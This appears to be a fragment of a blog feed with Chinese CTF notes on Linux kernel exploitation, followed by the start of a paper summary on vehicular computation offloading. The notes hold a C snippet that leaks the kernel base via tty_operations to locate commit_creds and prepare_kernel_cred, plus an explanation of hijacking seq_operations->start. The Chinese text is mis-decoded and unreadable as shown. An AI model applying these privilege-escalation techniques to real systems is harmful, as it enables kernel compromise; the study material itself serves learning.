class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,  </span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span>  <br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);  <br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);  <br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,  <br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);  <br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);  <br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,  <br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);  <br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,  <br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);  <br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);  <br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);  <br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);  <br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);  <br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);  <br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);  <br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);  <br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,  <br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);  <br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);  <br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);  <br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,  <br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);  <br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);  <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL  </span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);  <br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);  <br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>    <span class="hljs-type">int</span> (*proc_show)(<span class="hljs-keyword">struct</span> seq_file *, <span class="hljs-type">void</span> *);  <br>&#125; __randomize_layout;  <br></code></pre></td></tr></table></figure><h5 id="leak-kernel-base">leak kernel_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//no kalsr---&gt;kernel_base = 0xffffffff81000000;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><br><br>tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>kernel_base = (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)kernel_base + kernel_offset);<br>prepare_kernel_cred = PREPARE_KERNEL_CRED + kernel_offset;<br>commit_creds = COMMIT_CREDS + kernel_offset;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] Kernel offset: 0x%llx\n&quot;</span>, kernel_offset);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] Kernel base: %p\n&quot;</span>, kernel_base);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[34m\033[1m*\033[0m] prepare_kernel_cred: 0x%llx\n&quot;</span>, prepare_kernel_cred);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[\033[32m\033[1m+\033[0m] commit_creds: %p\n&quot;</span>, commit_creds);<br></code></pre></td></tr></table></figure><h4 id="msg">msg</h4><blockquote><p>æˆ‘ä»¬éƒ½å­¦è¿‡æ“ä½œç³»ç»Ÿï¼Œé‚£å°±ç»•ä¸å¼€é€šä¿¡çš„é—®é¢˜ï¼Œæ— è®ºæ˜¯è¿›ç¨‹é—´é€šä¿¡ï¼Œè¿˜æ˜¯ç½‘ç»œç¼–ç¨‹ï¼Œlinux éƒ½ç»™äº†æˆ‘ä»¬å¾ˆå¤šå‡½æ•°ï¼Œæ¯”å¦‚è¯´æ¶ˆæ¯é˜Ÿåˆ— msg_queueï¼Œå¥—æ¥å­— socketï¼Œç®¡é“ pipe ç­‰ç­‰ï¼Œé‚£ä¹ˆæ—¢ç„¶æ˜¯è¿›ç¨‹é—´é€šä¿¡ï¼Œå¿…é¡»ä¼šä½¿ç”¨åˆ°å†…æ ¸ç©ºé—´ï¼Œå› æ­¤ä¹Ÿä¸€å®šç”³è¯·å†…æ ¸å †å—ï¼Œåˆ›å»ºç»“æ„ä½“ï¼Œå› æ­¤éœ€è¦ä»è¿™äº›ç»“æ„ä½“ï¼Œå®Œæˆå¯¹ double free çš„åˆ©ç”¨ã€‚</p></blockquote><p>æ¶ˆæ¯é˜Ÿåˆ— msg_queueï¼Œæœ‰å¦‚ä¸‹å‡½æ•°ï¼šmsgget(å¾—åˆ°æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æˆ–åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å¯¹è±¡)ã€msgctl (è·å–å’Œè®¾ç½®æ¶ˆæ¯é˜Ÿåˆ—çš„å±æ€§)ã€msgsnd(å°†æ¶ˆæ¯å†™å…¥åˆ°æ¶ˆæ¯é˜Ÿåˆ—)ã€msgrcv(ä»æ¶ˆæ¯é˜Ÿåˆ—è¯»å–æ¶ˆæ¯)</p><h5 id="åˆ›å»ºç»“æ„-2">åˆ›å»ºç»“æ„</h5><h6 id="msgget">msgget</h6><p>åœ¨ä½¿ç”¨å‡½æ•° msgget åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ª msg_queue ç»“æ„ä½“ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> &#123;</span><span class="hljs-comment">//msgé˜Ÿåˆ—ç»“æ„ä½“</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kern_ipc_perm</span> <span class="hljs-title">q_perm</span>;</span> <span class="hljs-comment">//æ¯ä¸ªipc ç›¸å…³ç»“æ„ä½“éƒ½è¦æœ‰q_perm</span><br><span class="hljs-type">time64_t</span> q_stime;<span class="hljs-comment">/* last msgsnd time */</span><br><span class="hljs-type">time64_t</span> q_rtime;<span class="hljs-comment">/* last msgrcv time */</span><br><span class="hljs-type">time64_t</span> q_ctime;<span class="hljs-comment">/* last change time */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_cbytes;<span class="hljs-comment">/* å½“å‰æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„å­—èŠ‚æ•° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* å½“å‰æ¶ˆæ¯é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯æ•° */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* æ¶ˆæ¯é˜Ÿåˆ—ä¸­å…è®¸çš„æœ€å¤§å­—èŠ‚æ•° */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* pid of last msgsnd */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* last receive pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span><span class="hljs-comment">/* æ¶ˆæ¯é˜Ÿåˆ— */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h6 id="msgsnd">msgsnd</h6><p>ä½¿ç”¨ msgsnd å‘è¯¥æ¶ˆæ¯å‘é€ä¸€æ®µæ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ª msg_msg ç»“æ„ä½“ï¼Œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><span class="hljs-comment">//ä¸»æ¶ˆæ¯æ®µå¤´éƒ¨</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span> <span class="hljs-comment">//æ¶ˆæ¯åŒå‘é“¾è¡¨æŒ‡é’ˆ</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* æ¶ˆæ¯å¤§å° */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">//æŒ‡å‘æ¶ˆæ¯ç¬¬äºŒæ®µ</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* åé¢æ¥ç€æ¶ˆæ¯çš„æ–‡æœ¬ */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><span class="hljs-comment">//å­æ¶ˆæ¯æ®µå¤´éƒ¨</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€æ®µçš„æŒ‡é’ˆï¼Œæœ€å¤šä¸‰æ®µ</span><br><span class="hljs-comment">/* åé¢æ¥ç€æ¶ˆæ¯ç¬¬äºŒ/ä¸‰æ®µçš„æ–‡æœ¬ */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="seq">seq</h4><h5 id="åˆ›å»ºç»“æ„-3">åˆ›å»ºç»“æ„</h5><p>å½“æˆ‘ä»¬æ‰“å¼€ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼ˆå¦‚ <code>/proc/self/stat</code> ï¼‰ä¾¿ä¼šåœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†é…ä¸€ä¸ª seq_operations ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/seq_file.h</code> å½“ä¸­ï¼Œåªå®šä¹‰äº†å››ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br>    <span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>    <span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br>    <span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="leak">leak</h5><p>æ³„éœ²å†…æ ¸ä»£ç æ®µåœ°å€</p><h5 id="æ§åˆ¶æ‰§è¡Œæµ">æ§åˆ¶æ‰§è¡Œæµ</h5><p>å½“æˆ‘ä»¬ read ä¸€ä¸ª stat æ–‡ä»¶æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨å…¶ proc_ops çš„ <code>proc_read_iter</code> æŒ‡é’ˆï¼Œå…¶é»˜è®¤å€¼ä¸º <code>seq_read_iter()</code> å‡½æ•°ï¼Œå®šä¹‰äº <code>fs/seq_file.c</code> ä¸­ï¼Œæ³¨æ„åˆ°æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br>    <span class="hljs-comment">//...</span><br>    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>å³å…¶ä¼šè°ƒç”¨ seq_operations ä¸­çš„ start å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ seq_operations-&gt;start åå†è¯»å–å¯¹åº” stat æ–‡ä»¶ä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</strong></p><h3 id="kernel-rop">kernel rop</h3><h3 id="ret2usr">ret2usr</h3><h3 id="Race-Condition-2">Race Condition</h3><h4 id="userfaultfd">userfaultfd</h4><h4 id="double-fetch">double fetch</h4><h3 id="modprobe-path">modprobe_path</h3><h3 id="heap-overflow">heap overflow</h3><h3 id="ret2dir">ret2dir</h3><h3 id="uaf">uaf</h3><h2 id="çŸ¥è¯†å‚¨å¤‡">çŸ¥è¯†å‚¨å¤‡</h2><h3 id="ELFæ–‡ä»¶æ ¼å¼">ELFæ–‡ä»¶æ ¼å¼</h3><p>C</p><p>realloc/malloc/calloc</p><h3 id="å‡½æ•°è°ƒç”¨çº¦å®š">å‡½æ•°è°ƒç”¨çº¦å®š</h3><h3 id="å¸¸è§åæ±‡ç¼–æŒ‡ä»¤">å¸¸è§åæ±‡ç¼–æŒ‡ä»¤</h3><h3 id="ptmallocå †æ•°æ®ç»“æ„">ptmallocå †æ•°æ®ç»“æ„</h3><h3 id="ptmallocå †ç®¡ç†æœºåˆ¶">ptmallocå †ç®¡ç†æœºåˆ¶</h3><p>æœ€å¥½å­¦è¿™ä¸ªæœºåˆ¶å°±æ˜¯å»çœ‹å®ƒçš„æºç </p><h3 id="More">More</h3><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="https://www.anquanke.com/post/id/177832#h2-0">Canaryä¿æŠ¤è¯¦è§£å’Œå¸¸ç”¨Bypassæ‰‹æ®µ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://www.anquanke.com/post/id/177520">PIEä¿æŠ¤è¯¦è§£å’Œå¸¸ç”¨bypassæ‰‹æ®µ-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">Environment - CTF Wiki (ctf-wiki.org)</a></p><p><a href="https://lantern.cool/note-pwn-linux-protect/">Linux å¸¸ç”¨ä¿æŠ¤æœºåˆ¶ | Lanternâ€™s å°ç«™</a></p><p><a href="https://www.cnblogs.com/murkuo/p/15965270.html">pwndbg åŸºæœ¬æ“ä½œæŒ‡ä»¤ - MuRKuo - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">glibc2.31ä¸‹çš„æ–°double freeæ‰‹æ³•/å­—èŠ‚è·³åŠ¨pwné¢˜guné¢˜è§£_glibc 2.31ä¸‹å­˜åœ¨doublefreeå—-CSDNåšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ALL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>A Deep Learning Based Energy-Efficient  Computational Offloading Method in Internet of  Vehicles</title>
    <link href="/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/"/>
    <url>/2024/01/21/%E8%AF%BB%E8%AE%BA%E6%96%87/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><p>è¦åšæ¯•è®¾æƒ¹</p><h2 id="ä¸€ç§åŸºäºæ·±åº¦å­¦ä¹ çš„è½¦è”ç½‘èŠ‚èƒ½è®¡ç®—å¸è½½æ–¹æ³•">ä¸€ç§åŸºäºæ·±åº¦å­¦ä¹ çš„è½¦è”ç½‘èŠ‚èƒ½è®¡ç®—å¸è½½æ–¹æ³•</h2><p>A Deep Learning Based Energy-Efficient  Computational Offloading Method in Internet of  Vehicles</p><h3 id="æ‘˜è¦"><strong>æ‘˜è¦</strong></h3><p>éšç€å…ˆè¿›çš„è½¦è½½åº”ç”¨ç¨‹åºçš„å‡ºç°ï¼Œæ»¡è¶³è½¦è¾†çš„è®¡ç®—å’Œé€šä¿¡éœ€æ±‚çš„æŒ‘æˆ˜å˜å¾—è¶Šæ¥è¶Šçªå‡ºã€‚é›¾è®¡ç®—æ˜¯ä¸€ç§æ½œåœ¨çš„è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡å®ç°åœ¨ç½‘ç»œè¾¹ç¼˜çš„è®¡ç®—å¸è½½æ¥æ”¹å–„å…ˆè¿›çš„è½¦è¾†æœåŠ¡ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§åœ¨è½¦è¾†äº’è”ç½‘ï¼ˆIoVï¼‰ä¸­çš„é›¾äº‘è®¡ç®—å¸è½½ç®—æ³•ï¼Œä»¥æœ€å°åŒ–è½¦è¾†çš„åŠŸè€—å’Œè®¡ç®—è®¾æ–½çš„åŠŸè€—ã€‚</p><p><strong>1.é¦–å…ˆï¼Œå»ºç«‹äº†ç³»ç»Ÿæ¨¡å‹</strong></p><p><strong>2.ç„¶åå°†å¸è½½é—®é¢˜è¡¨è¿°ä¸ºä¸€ä¸ªnpéš¾é—®é¢˜ã€‚</strong></p><p><strong>3.æ¥ç€æå‡ºäº†ä¸€ç§å¯å‘å¼ç®—æ³•æ¥é€æ­¥è§£å†³å¸è½½é—®é¢˜ã€‚</strong></p><p><strong>å…·ä½“æ¥è¯´ï¼Œè®¾è®¡äº†ä¸€ç§è½¦è¾†çš„é¢„æµ‹ç»„åˆä¼ è¾“æ¨¡å¼ï¼Œå¹¶å»ºç«‹äº†ä¸€ç§è®¡ç®—è®¾æ–½çš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼Œä»¥è·å¾—æœ€ä¼˜çš„å·¥ä½œè´Ÿè·åˆ†é…ã€‚</strong></p><p>ä»¿çœŸç»“æœè¡¨æ˜äº†è¯¥ç®—æ³•åœ¨èƒ½æºæ•ˆç‡å’Œç½‘ç»œå»¶è¿Ÿæ–¹é¢çš„ä¼˜è¶Šæ€§</p><h3 id="å…³é”®è¯"><strong>å…³é”®è¯</strong></h3><p>è®¡ç®—å¸è½½ã€é›¾è®¡ç®—ã€æ·±åº¦å­¦ä¹ ï¼›è½¦è¾†ç½‘ç»œ</p><h3 id="1-ä»‹ç»">1.ä»‹ç»</h3><p>â€‹éšç€ç‰©è”ç½‘ï¼ˆIoTï¼‰å’Œæ— çº¿é€šä¿¡æŠ€æœ¯çš„å‘å±•ï¼Œè½¦è¾†å˜å¾—æ›´åŠ æ™ºèƒ½ï¼Œèƒ½å¤Ÿæä¾›æ¯”ä»¥å‰æ›´å¥½çš„æœåŠ¡ã€‚éšåï¼Œè‡ªåŠ¨é©¾é©¶ã€å›¾åƒè¯†åˆ«ç­‰å„ç§è®¡ç®—å¯†é›†å‹åº”ç”¨ä¸æ–­æ¶Œç°ã€‚ç„¶è€Œï¼Œè½¦è¾†æœ‰é™çš„è®¡ç®—èµ„æºå¯¼è‡´é«˜çº§åº”ç”¨éš¾ä»¥åœ¨ç°å®ä¸­åº”ç”¨ã€‚å¦‚æœæ²¡æœ‰å¼ºå¤§çš„è®¡ç®—æ”¯æŒï¼Œå„ç§åº”ç”¨ä»å¤„äºæ¦‚å¿µé˜¶æ®µï¼Œæ— æ³•åº”ç”¨äºæˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»ä¸­ã€‚</p><p>â€‹äº‘è®¡ç®—å¯ä»¥é€šè¿‡å°†ä»»åŠ¡å¸è½½åˆ°å…·æœ‰ä¸°å¯Œè®¡ç®—èµ„æºçš„äº‘ç«¯æ¥æé«˜è®¡ç®—æ€§èƒ½ã€‚ç„¶è€Œï¼Œæ•°æ®åˆ°äº‘ç«¯çš„ä¼ è¾“è·ç¦»è¾ƒé•¿ï¼Œä¸ä»…ç»™æ— çº¿é€šä¿¡é“¾è·¯å¸¦æ¥äº†æ²‰é‡çš„è´Ÿæ‹…ï¼Œè€Œä¸”å¯¼è‡´äº†éš¾ä»¥å¿å—çš„å»¶è¿Ÿï¼Œä»è€Œæ˜¾ç€é™ä½äº†åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</p><p>â€‹é›¾è®¡ç®—æ˜¯å…‹æœä¸Šè¿°é—®é¢˜çš„ä¸€ä¸ªæœ‰å‰é€”çš„èŒƒå¼ï¼Œå› ä¸ºå®ƒå°†è®¡ç®—è®¾æ–½æ‰©å±•åˆ°ç½‘ç»œå‰ç«¯ã€‚å®ƒè¿˜æœ‰æœ›å‡è½»è½¦è¾†æ²‰é‡çš„è®¡ç®—è´Ÿæ‹…ã€‚</p><p>1.é›¾èŠ‚ç‚¹é€šè¿‡å‡è½»äº‘çš„å·¥ä½œè´Ÿè½½æ¥é™ä½åŠŸè€—ã€‚</p><p>2.åœ°ç†åˆ†å¸ƒå¼é›¾è®¾å¤‡å¯ä»¥å‡å°‘æ¶ˆæ¯ä¼ è¾“å»¶è¿Ÿã€‚</p><p>ç„¶è€Œï¼Œä¸å¯èƒ½å°†æ‰€æœ‰ä»»åŠ¡å¸è½½åˆ°é›¾å±‚ï¼Œå› ä¸ºä»…é›¾æ¨¡å‹çš„è®¡ç®—èƒ½åŠ›æ— æ³•åº”å¯¹é«˜å·¥ä½œè´Ÿè½½ä¸‹çš„å»¶è¿Ÿå¢é•¿ï¼Œå¹¶ä¸”ä¸€äº›å¤æ‚çš„è®¡ç®—ä»»åŠ¡åº”è¯¥å¸è½½åˆ°è¿œç¨‹äº‘æœåŠ¡å™¨ã€‚å› 